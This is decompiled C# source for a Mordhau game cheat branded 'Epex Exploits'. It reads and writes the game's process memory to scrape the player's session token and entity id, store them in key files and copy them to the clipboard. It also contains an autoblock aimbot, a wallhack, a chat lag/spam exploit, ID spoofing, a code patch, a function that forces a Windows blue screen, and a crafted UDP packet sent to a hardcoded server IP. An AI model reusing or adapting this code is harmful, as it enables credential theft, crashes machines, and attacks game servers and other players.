			catch
			{
			}
			Thread.Sleep(2000);
			this.exploitstatus("Waiting for mordhau");
			if (Process.GetProcessesByName("Mordhau-Win64-Shipping").Length == 0)
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "steam://rungameid/629760",
					UseShellExecute = true
				});
				Thread.Sleep(2000);
				while (Process.GetProcessesByName("Mordhau-Win64-Shipping").Length == 0)
				{
					Thread.Sleep(1);
				}
				int procIdFromName = this.m.GetProcIdFromName("Mordhau-Win64-Shipping");
				this.m.OpenProcess(procIdFromName);
			}
			try
			{
				for (int j = 0; j < 100; j++)
				{
					this.exploitstatus("Trying to get the key...");
					if (this.tokenid.Length < 1)
					{
						Task<IEnumerable<long>> task = this.m.AoBScan("58 2D 45 6E 74 69 74 79 54 6F 6B 65 6E", true, false, "");
						task.Wait();
						foreach (long num in task.Result)
						{
							string text = this.m.ReadString(num.ToString("X"), "", 1000, true, Encoding.UTF8);
							if (text.Contains("User-Agent"))
							{
								text = text.Substring(text.IndexOf(' '), text.IndexOf('\n'));
								text = text.Replace(" ", "");
								text = text.Substring(0, text.IndexOf('\n'));
								text = text.Trim();
								this.tokenid = epex.mordhau.recode.Menu.xor(text);
							}
						}
						Thread.Sleep(1000);
					}
				}
				if (this.tokenid.Length < 1)
				{
					this.exploitstatuslabel.Visible = false;
					this.exploitstatus("Couldn't get the key");
				}
				else
				{
					epex.mordhau.recode.Menu.SafeInvoke(this.ketylabel, delegate
					{
						this.ketylabel.Text = string.Format("Secret-key: {0}", epex.mordhau.recode.Menu.hash(this.tokenid));
					});
					string text2 = Encoding.UTF8.GetString(Convert.FromBase64String(epex.mordhau.recode.Menu.unxor(this.tokenid)));
					text2 = text2.Trim();
					text2 = text2.Substring(text2.IndexOf("{"), text2.Length - text2.IndexOf("{"));
					text2 = text2.Substring(text2.IndexOf(",") + 1, text2.Length - text2.IndexOf(",") - 1);
					text2 = text2.Substring(text2.IndexOf(",") + 1, text2.Length - text2.IndexOf(",") - 1);
					text2 = text2.Substring(text2.IndexOf(",") + 1, text2.Length - text2.IndexOf(",") - 1);
					text2 = text2.Substring(text2.IndexOf(",") + 1, text2.Length - text2.IndexOf(",") - 1);
					text2 = text2.Substring(text2.IndexOf(",") + 1, text2.Length - text2.IndexOf(",") - 1);
					text2 = text2.Substring(text2.IndexOf(",") + 1, text2.Length - text2.IndexOf(",") - 1);
					text2 = text2.Substring(text2.IndexOf(",") + 1, text2.Length - text2.IndexOf(",") - 1);
					text2 = text2.Substring(text2.IndexOf(":") + 1, text2.IndexOf(",") - 5);
					this.entityid = epex.mordhau.recode.Menu.xor(text2.Trim(new char[] { '"' }));
					if (this.serverid.Length > 1)
					{
						epex.mordhau.recode.Menu.SafeInvoke(this.savetoken, delegate
						{
							this.savetoken.Enabled = true;
						});
					}
					this.exploitstatus("Key found!");
				}
			}
			catch
			{
				base.TopMost = false;
				MessageBox.Show("Couldn't get the key, try again", "Epex Exploits", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				Application.Exit();
			}
			this.disable(1);
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00005AC8 File Offset: 0x00003CC8
		private void savetoken_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog
			{
				InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
				Filter = "Epex keys (*.epex)|*.epex",
				RestoreDirectory = true,
				ShowHelp = true,
				CheckFileExists = false
			};
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				File.WriteAllText(saveFileDialog.FileName, Convert.ToBase64String(Encoding.UTF8.GetBytes(string.Concat(new string[] { this.tokenid, "|", this.entityid, "|", this.serverid }))) ?? "");
			}
			this.exploitstatus("Saved");
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00005B74 File Offset: 0x00003D74
		private void loadtoken_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog
				{
					InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
					Filter = "Epex keys (*.epex)|*.epex",
					RestoreDirectory = true,
					ShowHelp = true,
					CheckFileExists = false
				};
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.disable(0);
					this.disable(1);
					string text = File.ReadAllText(openFileDialog.FileName);
					string @string = Encoding.UTF8.GetString(Convert.FromBase64String(text));
					this.tokenid = @string.Substring(0, @string.IndexOf("|"));
					string text2 = @string.Substring(@string.IndexOf("|") + 1, @string.Length - @string.IndexOf("|") - 1);
					this.entityid = text2.Substring(0, text2.IndexOf("|"));
					this.serverid = text2.Substring(text2.IndexOf("|") + 1, text2.Length - text2.IndexOf("|") - 1);
					this.savetoken.Enabled = true;
					epex.mordhau.recode.Menu.SafeInvoke(this.serveridlabel, delegate
					{
						this.serveridlabel.Text = string.Format("Server id: {0}", epex.mordhau.recode.Menu.hash(this.serverid));
					});
					epex.mordhau.recode.Menu.SafeInvoke(this.ketylabel, delegate
					{
						this.ketylabel.Text = string.Format("Secret-key: {0}", epex.mordhau.recode.Menu.hash(this.tokenid));
					});
					this.exploitstatus("Loaded");
					Clipboard.SetText(string.Concat(new string[]
					{
						epex.mordhau.recode.Menu.unxor(this.tokenid),
						"|",
						epex.mordhau.recode.Menu.unxor(this.serverid),
						"|",
						epex.mordhau.recode.Menu.unxor(this.entityid)
					}));
				}
			}
			catch
			{
				Application.Exit();
			}
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00005D2C File Offset: 0x00003F2C
		public void BSOD()
		{
			bool flag;
			epex.mordhau.recode.Menu.RtlAdjustPrivilege(19, true, false, out flag);
			uint num;
			epex.mordhau.recode.Menu.NtRaiseHardError(3735936685U, 0U, 0U, (IntPtr)0, 6U, out num);
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00002391 File Offset: 0x00000591
		private void button2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00002391 File Offset: 0x00000591
		private void button3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00005D5C File Offset: 0x00003F5C
		public string type_resolver(int motiontag)
		{
			if (motiontag <= 147)
			{
				if (motiontag <= 11)
				{
					if (motiontag == 0)
					{
						return "Idle";
					}
					if (motiontag == 11)
					{
						return "Stab";
					}
				}
				else
				{
					if (motiontag == 21)
					{
						return "Strike";
					}
					if (motiontag == 147)
					{
						return "Stab";
					}
				}
			}
			else if (motiontag <= 166)
			{
				if (motiontag == 157)
				{
					return "Strike";
				}
				if (motiontag == 166)
				{
					return "Kick";
				}
			}
			else
			{
				if (motiontag == 176)
				{
					return "Stab";
				}
				if (motiontag == 186)
				{
					return "Strike";
				}
			}
			return "Nan";
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00005DF0 File Offset: 0x00003FF0
		private void Autoblock_Tick(object sender, EventArgs e)
		{
			int num = 0;
			int num2 = this.m.ReadInt(Offsets.PlayerSizeOffset, "") - 1;
			string text = Offsets.PlayerArray + ",0";
			for (int i = 0; i < num2; i++)
			{
				if (num == 0)
				{
					num = 8;
				}
				else
				{
					num += 8;
				}
				string text2 = string.Format("{0},{1:X}", Offsets.PlayerArray, num);
				if (this.m.ReadInt(Offsets.GameState + ",6B0", "") == 0 || this.m.ReadInt(text + ",378", "") != this.m.ReadInt(text2 + ",378", ""))
				{
					int num3 = this.m.ReadByte(text2 + ",280,AE8,38", "");
					float num4 = this.m.ReadFloat(Offsets.IngameFov, "", true);
					float num5 = this.m.ReadFloat(text + ",280,F14", "", true);
					float num6 = this.m.ReadFloat(text2 + ",280," + Offsets.player_x, "", true);
					float num7 = this.m.ReadFloat(text2 + ",280," + Offsets.player_y, "", true);
					float num8 = this.m.ReadFloat(text2 + ",280," + Offsets.player_z, "", true);
					float num9 = this.m.ReadFloat(text + ",280," + Offsets.player_x, "", true);
					float num10 = this.m.ReadFloat(text + ",280," + Offsets.player_y, "", true);
					float num11 = this.m.ReadFloat(text + ",280," + Offsets.player_z, "", true);
					Vector3 vector = new Vector3(num6 - num9, num7 - num10, num8 - num11);
					float num12 = (float)Math.Sqrt(Math.Pow((double)vector.X, 2.0) + Math.Pow((double)vector.Y, 2.0) + Math.Pow((double)vector.Z, 2.0));
					float num13 = (float)(Math.Atan2((double)vector.Y, (double)vector.X) * 57.295779513082323);
					float num14;
					for (num14 = num5 - num13; num14 < -180f; num14 += 360f)
					{
					}
					while (num14 > 180f)
					{
						num14 -= 360f;
					}
					float num15 = (float)Math.Round((double)Math.Abs(num14));
					int num16 = this.m.ReadInt(text2 + ",280,AE8,10D9", "");
					if (!this.playerlist.ContainsKey(text2))
					{
						this.playerlist.Add(text2, -1);
					}
					if (this.playerlist[text2] != 1 && num12 <= 300f && num15 <= num4 && num16 == 1 && num3 != 0)
					{
						this.m.WriteMemory(Offsets.wantsblock, "int", "1", "", null, true);
					}
					this.playerlist[text2] = num16;
				}
			}
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00002393 File Offset: 0x00000593
		private void debugbutton_CheckedChanged(object sender, EventArgs e)
		{
			if (this.debugbutton.Checked)
			{
				this.debuginfo.Start();
				return;
			}
			this.debuginfo.Stop();
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00006138 File Offset: 0x00004338
		private void debuginfo_Tick(object sender, EventArgs e)
		{
			string text = Offsets.PlayerArray + ",0,280";
			this.m.ReadFloat(Offsets.IngameFov, "", true);
			string text2 = Offsets.PlayerArray + ",8,280";
			float num = this.m.ReadFloat(text + ",520", "", true);
			float num2 = this.m.ReadFloat(text + ",F14", "", true);
			float num3 = this.m.ReadFloat(text2 + "," + Offsets.player_x, "", true);
			float num4 = this.m.ReadFloat(text2 + "," + Offsets.player_y, "", true);
			float num5 = this.m.ReadFloat(text2 + "," + Offsets.player_z, "", true);
			float num6 = this.m.ReadFloat(text + "," + Offsets.player_x, "", true);
			float num7 = this.m.ReadFloat(text + "," + Offsets.player_y, "", true);
			float num8 = this.m.ReadFloat(text + "," + Offsets.player_z, "", true);
			Vector3 vector = new Vector3(num3 - num6, num4 - num7, num5 - num8);
			float num9 = (float)Math.Sqrt(Math.Pow((double)vector.X, 2.0) + Math.Pow((double)vector.Y, 2.0) + Math.Pow((double)vector.Z, 2.0));
			float num10 = (float)(Math.Atan((double)(vector.Z / num9)) * 57.295780181884766 * -1.0);
			float num11 = (float)(Math.Atan2((double)vector.Y, (double)vector.X) * 57.295779513082323);
			float num12;
			for (num12 = num2 - num11; num12 < -180f; num12 += 360f)
			{
			}
			while (num12 > 180f)
			{
				num12 -= 360f;
			}
			while (num11 <= 0f)
			{
				num11 += 360f;
			}
			float num13 = (float)Math.Round((double)Math.Abs(num12));
			this.type_resolver(this.m.ReadByte(text2 + ",AE8,38", ""));
			this.m.WriteMemory(Offsets.good_yaw, "float", num11.ToString().Replace(",", ".") ?? "", "", null, true);
			this.mypitchlabel.Text = string.Format("Pitch: {0}", num);
			this.myyawlabel.Text = string.Format("Yaw: {0}", num2);
			this.enemyxlabel.Text = string.Format("Enemy X: {0}", num3);
			this.enemyylabel.Text = string.Format("Enemy Y: {0}", num4);
			this.enemyzlabel.Text = string.Format("Enemy Z: {0}", num5);
			this.myxlabel.Text = string.Format("My X: {0}", num6);
			this.myylabel.Text = string.Format("My Y: {0}", num7);
			this.myzlabel.Text = string.Format("My Z: {0}", num8);
			this.hypolabel.Text = string.Format("Hypotenuse: {0}", num9);
			this.reqpitchlabel.Text = string.Format("Requied pitch: {0}", num10);
			this.reqyawlabel.Text = string.Format("Requied yaw: {0}", num11);
			this.sukafovlabel.Text = string.Format("Fov: {0}", num13);
		}

		// Token: 0x06000052 RID: 82 RVA: 0x000023B9 File Offset: 0x000005B9
		private void toggleButton1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.toggleButton1.Checked)
			{
				this.Autoblock.Start();
				return;
			}
			this.Autoblock.Stop();
		}

		// Token: 0x06000053 RID: 83 RVA: 0x000023DF File Offset: 0x000005DF
		private void Wallhack_CheckedChanged(object sender, EventArgs e)
		{
			if (this.Wallhack.Checked)
			{
				this.overlay.Show();
				return;
			}
			this.overlay.Hide();
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00002405 File Offset: 0x00000605
		public static void sendKeystroke(ushort k, IntPtr hwnd)
		{
			epex.mordhau.recode.Menu.SendMessage(hwnd, 256U, (IntPtr)((int)k), (IntPtr)0);
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00006534 File Offset: 0x00004734
		public void clear_chat()
		{
			string text = Offsets.PlayerController + ",2B0,360,";
			this.m.WriteMemory(text + "378", "int", "0", "", null, true);
			this.m.WriteMemory(text + "37C", "int", "0", "", null, true);
			this.m.WriteMemory(text + "380", "int", "0", "", null, true);
			this.m.WriteMemory(text + "390", "int", "0", "", null, true);
			this.m.WriteMemory(text + "394", "int", "0", "", null, true);
			this.m.WriteMemory(text + "3B0", "int", "0", "", null, true);
			this.m.WriteMemory(text + "3B4", "int", "0", "", null, true);
			this.m.WriteMemory(text + "3C0", "int", "0", "", null, true);
			this.m.WriteMemory(text + "3CC", "int", "0", "", null, true);
		}

		// Token: 0x06000056 RID: 86 RVA: 0x000066BC File Offset: 0x000048BC
		private void spammertick_Tick(object sender, EventArgs e)
		{
			string text = Offsets.PlayerController + ",2B0,360,";
			string text2 = Offsets.PlayerController + ",2B0,360,3A0";
			string text3 = Offsets.PlayerController + ",2B0,360,364";
			if (this.lagbutton.Checked)
			{
				this.m.WriteMemory(text2, "float", "-1", "", null, true);
				this.m.WriteMemory(text3, "int", "32753", "", null, true);
				IntPtr intPtr = epex.mordhau.recode.Menu.FindWindow("UnrealWindow", null);
				if (epex.mordhau.recode.Menu.GetForegroundWindow() == intPtr && epex.mordhau.recode.Menu.GetAsyncKeyState(this.lagbind) == 32768)
				{
					Clipboard.SetText("Removed cuz its fucking annoying ~Snow");
					this.m.WriteMemory(text + "360", "byte", "1", "", null, true);
					this.m.WriteMemory(text + "368", "byte", "0", "", null, true);
					Thread.Sleep(10);
					epex.mordhau.recode.Menu.sendKeystroke(17, intPtr);
					epex.mordhau.recode.Menu.sendKeystroke(86, intPtr);
					epex.mordhau.recode.Menu.sendKeystroke(13, intPtr);
					Thread.Sleep(10);
					this.clear_chat();
					Clipboard.Clear();
					Thread.Sleep(200);
				}
			}
		}

		// Token: 0x06000057 RID: 87 RVA: 0x0000680C File Offset: 0x00004A0C
		public static string xorIt(string key, string input)
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < input.Length; i++)
			{
				stringBuilder.Append(input[i] ^ key[i % key.Length]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00006854 File Offset: 0x00004A54
		private void button2_Click_1(object sender, EventArgs e)
		{
			byte[] array = new byte[]
			{
				96, 126, 149, 250, 254, byte.MaxValue, byte.MaxValue, byte.MaxValue, 227, 140,
				4, 168, 38, 51, 221, 176, 152, 161, 180, 146,
				97, 25, 0, 0, 64, 88, 88, 88, 88, 88,
				88, 88, 88, 88, 88, 88, 88, 88, 88, 88,
				88, 88, 88, 88, 88, 88, 88, 88, 88, 88,
				88, 88, 88, 88, 88, 88, 88, 88, 88, 88,
				88, 88, 88, 88, 88, 88, 88, 88, 88, 88,
				88, 88, 88, 88, 88, 88, 88, 88, 88, 88,
				88, 88, 88, 88, 88, 88, 88, 88, 88, 88,
				88, 88, 88, 88, 88, 88, 88, 88, 88, 88,
				88, 88, 88, 88, 88, 88, 88, 88, 88, 88,
				88, 88, 88, 88, 88, 88, 88, 88, 88, 88,
				88, 88, 88, 88, 24, 128, 1
			};
			string text = "185.189.255.19";
			int num = 26100;
			IPEndPoint ipendPoint = new IPEndPoint(IPAddress.Parse(text), num);
			new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp).SendTo(array, ipendPoint);
		}

		// Token: 0x06000059 RID: 89 RVA: 0x0000241F File Offset: 0x0000061F
		public static string RandomString(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("ABCDEF0123456789", length)
				select s[epex.mordhau.recode.Menu.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x0600005A RID: 90 RVA: 0x0000245A File Offset: 0x0000065A
		private void button4_Click(object sender, EventArgs e)
		{
			this.loxid = this.playfabid.Text;
			//this.mynewfab = epex.mordhau.recode.Menu.RandomString(16);
			this.mynewfab = this.playfabid.Text;
			this.loxfab.Start();
		}

		// Token: 0x0600005B RID: 91 RVA: 0x0000689C File Offset: 0x00004A9C
		private void loxfab_Tick(object sender, EventArgs e)
		{
			this.m.WriteMemory(Offsets.PlayerArray + ",0,3A8,0", "string", this.mynewfab, "", Encoding.Unicode, true);
			this.m.WriteMemory(Offsets.PlayerArray + ",8,3A8,0", "string", this.loxid, "", Encoding.Unicode, true);
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00002485 File Offset: 0x00000685
		private void lagbindbutton_Click(object sender, EventArgs e)
		{
			this.needbind = this.lagbindbutton;
			this.whooneedsbind = "lag";
			this.binder.Start();
		}

		// Token: 0x0600005D RID: 93 RVA: 0x0000690C File Offset: 0x00004B0C
		private void button3_Click_1(object sender, EventArgs e)
		{
			Task<IEnumerable<long>> task = this.m.AoBScan("89 14 01 4C 8D 4C 24 31", false, true, "");
			task.Wait();
			foreach (long num in task.Result)
			{
				byte[] array = new byte[] { 144, 144, 144 };
				Imps.MemoryProtection memoryProtection = Imps.MemoryProtection.ExecuteReadWrite;
				if (this.m.ChangeProtection(num.ToString("X"), Imps.MemoryProtection.ExecuteReadWrite, out memoryProtection, ""))
				{
					this.m.WriteBytes(num.ToString("X"), array, "");
					this.m.ChangeProtection(num.ToString("X"), memoryProtection, out memoryProtection, "");
				}
			}
			this.button3.ForeColor = Color.LimeGreen;
			this.button3.Text = "Done";
		}

		// Token: 0x0400000D RID: 13
		public const int WM_NCLBUTTONDOWN = 161;

		// Token: 0x0400000E RID: 14
		public const int HT_CAPTION = 2;

		// Token: 0x0400000F RID: 15
		public int lasttab;

		// Token: 0x04000010 RID: 16
		public bool alive;

		// Token: 0x04000011 RID: 17
		public Button lastbutton;

		// Token: 0x04000012 RID: 18
		private Mem m = new Mem();

		// Token: 0x04000013 RID: 19
		public bool isvisible = true;

		// Token: 0x04000014 RID: 20
		public string tokenid = "";

		// Token: 0x04000015 RID: 21
		public string entityid = "";

		// Token: 0x04000016 RID: 22
		public string serverid = "";

		// Token: 0x04000017 RID: 23
		private Control needbind;

		// Token: 0x04000018 RID: 24
		public int animbreakerbind;

		// Token: 0x04000019 RID: 25
		public int lagbind;

		// Token: 0x0400001A RID: 26
		public string whooneedsbind = "";

		// Token: 0x0400001B RID: 27
		public vkeys key = new vkeys();


		// Token: 0x0400001D RID: 29
		public Dictionary<string, int> playerlist = new Dictionary<string, int>();

		// Token: 0x0400001E RID: 30
		public Dictionary<string, float> distancelist = new Dictionary<string, float>();

		// Token: 0x0400001F RID: 31
		private Overlay overlay = new Overlay();

		// Token: 0x04000020 RID: 32
		private static Random random = new Random();

		// Token: 0x04000021 RID: 33
		private string loxid = "";

		// Token: 0x04000022 RID: 34
		private string mynewfab = "";

        private void button5_Click(object sender, EventArgs e)
        {
			this.LoadForm(5, sender);

		}

        private void ballistabutton_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
